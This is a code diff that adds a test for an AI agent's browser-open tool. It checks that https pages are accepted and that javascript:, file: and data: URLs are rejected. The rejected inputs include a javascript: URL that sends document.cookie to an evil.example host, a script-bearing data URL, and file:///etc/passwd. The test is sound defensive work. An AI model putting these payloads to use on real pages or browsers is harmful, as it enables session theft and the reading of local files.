@@ -116,6 +116,19 @@ describe("computer tools", () => {
     }
   });
 
+  it("open only web pages, and give a script address no site", async () => {
+    const open = byName(browserTools(null), "browser.open");
+    expect(open.input.safeParse({ url: "https://shop.example/a" }).success).toBe(true);
+    for (const url of [
+      "javascript://shop.example/%0afetch('https://evil.example/'+document.cookie)",
+      "javascript:alert(1)",
+      "file:///etc/passwd",
+      "data:text/html,<script>1</script>",
+    ]) {
+      expect(open.input.safeParse({ url }).success, url).toBe(false);
+    }
+  });
+
   it("run the browser as the calling agent and return the page as untrusted text", async () => {
     const { provider, calls } = fakeSandbox();
     const tools = browserTools(provider);
